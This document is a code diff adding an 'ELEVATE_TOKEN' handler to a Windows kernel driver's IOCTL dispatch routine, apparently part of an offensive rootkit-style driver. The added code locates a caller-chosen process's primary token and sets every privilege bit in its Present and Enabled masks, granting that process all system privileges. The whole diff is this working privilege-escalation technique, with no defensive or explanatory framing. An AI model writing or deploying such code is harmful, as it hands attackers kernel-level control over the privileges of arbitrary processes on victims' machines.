@@ -111,6 +111,44 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 			KdPrint(("The program does not exist or it is not recheable %d", pid));
 			break;
 		}
+	case ELEVATE_TOKEN:
+
+		pid = *(HANDLE*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+
+		KdPrint(("Someone used the driver with IOCTL 0x%08p and want to change %d process protection\n", stack->Parameters.DeviceIoControl.IoControlCode, pid));
+
+		if (pid != 0) {
+			PsLookupProcessByProcessId(pid, &eProcess);
+
+			PACCESS_TOKEN hToken = PsReferencePrimaryToken(eProcess);
+
+			PSEP_TOKEN_PRIVILEGES tokenPrivs = (PSEP_TOKEN_PRIVILEGES)(((ULONG_PTR)hToken) + PRIVILEGE_TOKEN_OFFSET);
+
+			if (tokenPrivs == nullptr)
+			{
+				KdPrint(("[+] PSEP_TOKEN_PRIVILEGES was null\n"));
+				status = STATUS_INVALID_PARAMETER;
+
+				ObDereferenceObject(eProcess);
+
+				break;
+			}
+
+			tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = 0xff;
+			tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = 0xff;
+			tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = 0xff;
+			tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = 0xff;
+
+			ObDereferenceObject(eProcess);
+
+			PsDereferencePrimaryToken(hToken);
+
+			break;
+		}
+		else {
+			KdPrint(("The program does not exist or it is not recheable %d", pid));
+			break;
+		}
 
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
